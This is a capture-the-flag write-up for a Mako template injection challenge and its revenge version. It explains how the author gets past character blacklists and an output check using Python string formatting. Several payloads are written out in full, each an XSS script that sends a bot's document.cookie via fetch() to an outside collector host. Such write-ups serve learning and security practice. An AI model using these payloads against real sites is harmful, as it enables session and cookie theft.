# WEB/KISSFIXESS
## Description
Kiss My Fixes.
Ain't nobody solving this now.

## Challenge Overview 
So we were given a simple website with MAKO templating in which our we could give name as input and it would be displayed in rainbow pixel and flag was in bot's cookie
and it was clearly visible that [SSTI(Server side template injection)](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation) 
was possible and we needed to use it to get XSS somehow as there were many things that were banned.

OK Lets understand the whole thing one by one,The website takes our input as a URL paramerter `name_input` and then the url is parsed and then before rendering anything
then value of the parameter is checked against a banned list of words and if any of the banned words is there then the name is replaced by `Banned characters detected!`

```python
banned = ["s", "l", "(", ")", "self", "_", ".", "\"", "\\", "import", "eval", "exec", "os", ";", ",", "|"]
```

```python
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):

        # Parse the path and extract query parameters
        parsed_url = urlparse(self.path)
        params = parse_qs(parsed_url.query)
        name = params.get("name_input", [""])[0]
        
        for b in banned:
            if b in name:
                name = "Banned characters detected!"
                print(b)

        # Render and return the page
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(render_page(name_to_display=name).encode("utf-8"))
```
If the banned check is passed then the render_page is called (Renders the HTML page with the given name.) in which again HTML escaping is done to our name and then
the name_input parameter was directly embedded into the HTML template string on the server before the template was rendered. 
```python

def escape_html(text):
    """Escapes HTML special characters in the given text."""
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("(", "&#40;").replace(")", "&#41;")

def render_page(name_to_display=None):
    """Renders the HTML page with the given name."""
    templ = html_template.replace("NAME", escape_html(name_to_display or ""))
    template = Template(templ, lookup=lookup)
    return template.render(name_to_display=name_to_display, banned="&<>()")

```
Since our name was direclty embeded into the template, SSTI was clearly possible as no check was stopping it (you could check with `${7*7}`). Basically in SSTI anything
you put in the `${..}` is treated as python expression as MAKO is python template engine and it would have access to all of Python's standard built-in functions 
and variables and also the variables that we give while calling the render function like in this case we have access to the variable banned that was given while rendering 
`return template.render(name_to_display=name_to_display, banned="&<>()")`. So it means even though `<` is banned we could get them using `${banned[1]}` and similarly
`>()`, I thought we would need to use the banned varibable somewhere but we were able to solve this without using this.

Ok since now we have understood how things are going lets start with the most basic payload we would need to steal the cookie and then we would see how we will bypass
these filters,So the most basic payload that would do the job is as simple as this. 
```html
<script>fetch('https://YOUR_SERVER/?c='+document.cookie)</script>
```
Now since <> are getting escaped we could use `${banned[1]}` to use them and also s is also in banned so instead we could use `<Script>` as html tags are case insensitive
and for () also we could use `${banned[3]}` again but we can't get `=`or `.` like this so we have to think of something,
Since anything inside `${..}` is a python expression so we could take help of it and so after some looking I found a way, `STRING FORMATTING` you could use something 
like `'%c'%60`, Basically The `%` tells Python that you want to format the string, and the `c` specifically means "treat the corresponding value as an integer ASCII 
code and convert it to a single character and the % in the `% 60`  acts as the link between the string and the value(s) to be formatted and since all any of these chars
or numbers are not banned so we could create the whole payload like this and bamm the challenge is solved, The final payload is 
```html
${'%c'%60}Script${'%c'%62}fetch${'%c'%40}'httpS://3x0tic${'%c'%46}requeStcatcher${'%c'%46}com/?c${'%c'%61}'+document${'%c'%46}cookie${'%c'%41}${'%c'%60}/Script${'%c'%62}
```

# Revenge Challenge 

So a Revenge challenge was released for this challenge , the result of the diff command on the challenge files
```bash
diff -r kissfixess/public/main.py kissfixessrevenge/public/main.py
198c198
< banned = ["s", "l", "(", ")", "self", "_", ".", "\"", "\\", "import", "eval", "exec", "os", ";", ",", "|"]
---
> banned = ["s", "l", "(", ")", "self", "_", ".", "\"", "\\", "&", "%", "^", "#", "@", "!", "*", "-", "import", "eval", "exec", "os", ";", ",", "|", "JAVASCRIPT", "window", "atob", "btoa", "="]
207c207
<     templ = html_template.replace("NAME", escape_html(name_to_display or ""))
---
>     templ = html_template.replace("NAME", name_to_display or "")
209c209,218
<     return template.render(name_to_display=name_to_display, banned="&<>()")
---
>     tp = template.render(name_to_display=name_to_display, banned="&<>()", copyright="haha", help="haha", quit="haha")
>     try:
>         tp_data = tp.split("<div class=\"rainbow-text\">")[1].split("</div>")[0]
>         if "." in tp_data or "href" in tp_data.lower():
>             name = " "
>             return name
>     except IndexError:
>         pass
>
>     return tp
```

Ok so not many changes were done in the challenge,Now more chars are in the banned list but now no html escaping is done before rendering the name but a 
check has been added after rendering in which it checks the div in which our name is coming for `.` or `href`, If its there then it replaces the name with 
`Banned characters detected!`

Ok so we will start again to find a bypass for these blacklisted chars since now we can't use `%` so can't use the method we used before but we could try to
do something similiar to that and again after some searching , Found another way for `STRING FORMATTING` or `Formatted string literal` , `f'{61:c}'` would return 
char `=`, Basically in this The f prefix before the string tells Python that this is a special f-string and that it should evaluate any expressions it finds 
inside curly braces {} Inside the string, the curly braces denote an expression that Python needs to execute.The colon inside the curly braces separates 
the value (on the left) from its format specifier (on the right) and `c`is the format specifier.

The first test of banned chars has been bypassed but the check which is being done after rendering is still there but that is also easy to bypass as you see that
its only checking inside the `<div class=\"rainbow-text\">`, So we could just close the div and then put our payload and it would work fine
```html
 </div><Script>fetch${banned[3]}'httpS://3x0tic${f'{46:c}'}requeStcatcher${f'{46:c}'}com/?c${f'{61:c}'}'+document${f'{46:c}'}cookie${banned[4]}</Script>
```
This is the final payload and Thats how you get the FLAG.
